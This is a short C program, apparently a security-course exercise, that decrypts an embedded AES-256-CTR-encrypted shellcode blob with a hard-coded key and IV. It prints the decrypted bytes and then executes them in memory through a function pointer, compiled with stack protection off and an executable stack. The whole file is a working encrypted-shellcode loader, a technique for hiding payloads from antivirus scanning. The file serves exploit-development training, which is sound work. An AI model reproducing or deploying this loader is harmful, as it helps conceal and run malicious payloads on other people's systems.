// aes shellcode decrypter and execution
// compile: 	gcc decshellcode.c -lcrypto -fno-stack-protector -zexecstack -o decshellcode
// 
// INPUT: 	encrypted shellcode
//		key
//		IV
// OUTPUT:	shellcode (executed)
// StudentID: 	SLAE645

#include <stdio.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

void print_bytes (unsigned char arr[], int size)
{
	int i;
	for (i = 0; i < size; i++)
	{

	printf("\\x%02x", arr[i]);
	}
	printf("\n");
}


int main()
{
	EVP_CIPHER_CTX ctx2;

	// <><><> Input the encrypted shellcode generated from encshellcode executable
	unsigned char encshellcode[]=\
"\x2c\xf5\xc7\xd9\x13\x1b\xd4\x3e\x13\x5e\xf9\xc0\xea\x7e\x14\xce\x8a\xc4\xe7\x6e\x6f\x52\x0e\x28\x5b\xe7\x2c\x94\x70\x43\x35\x10\x80\x74\xf8\x33\x1e\x1f\xc7\x74\x0e\xc8\x04\xb4\xeb";

    	// <><><> Input the key you used during encryption
	// max length 64 characters (512 bits), we will use 32 (256 bits)
	// echo "slae" | sha256sum -->> 825283f16463886dfd671599fb0aa61345e65f5ec8d46d2818ea9e56fe471f37
	unsigned char key[EVP_MAX_KEY_LENGTH] = "\x82\x52\x83\xf1\x64\x63\x88\x6d\xfd\x67\x15\x99\xfb\x0a\xa6\x13\x45\xe6\x5f\x5e\xc8\xd4\x6d\x28\x18\xea\x9e\x56\xfe\x47\x1f\x37";
	// <><> <> Input the IV generated during encryption
	unsigned char iv[EVP_MAX_IV_LENGTH]="\xc7\x4d\x24\xf7\xf0\x1b\xd0\xb0\xa2\xc2\x6d\x25\x84\x8b\x54\x2f";	
    	unsigned char decout[sizeof(encshellcode)];
	int declen1, declen2;
	
	int (*ret)() = (int(*)())decout;
	
	EVP_DecryptInit(&ctx2, EVP_aes_256_ctr(), key, iv);
    	EVP_DecryptUpdate(&ctx2, decout, &declen1, encshellcode, sizeof(encshellcode)-1);
    	EVP_DecryptFinal(&ctx2, decout + declen1, &declen2);
	printf("[*] We have read %d bytes, and generated %d bytes of decrypted output\n", sizeof(encshellcode)-1, declen1+declen2);
	printf("\n --- Decrypted shellcode dump ---\n");
	BIO_dump_fp(stdout, decout, sizeof(decout)-1);
	EVP_CIPHER_CTX_cleanup(&ctx2);

	EVP_cleanup();	
	CRYPTO_cleanup_all_ex_data();
	
	printf("\n");
	print_bytes(decout, sizeof(decout)-1);
	printf("Calling decrypted code...\n\n");
	ret();
	printf("\n\n");
	return 0;
}

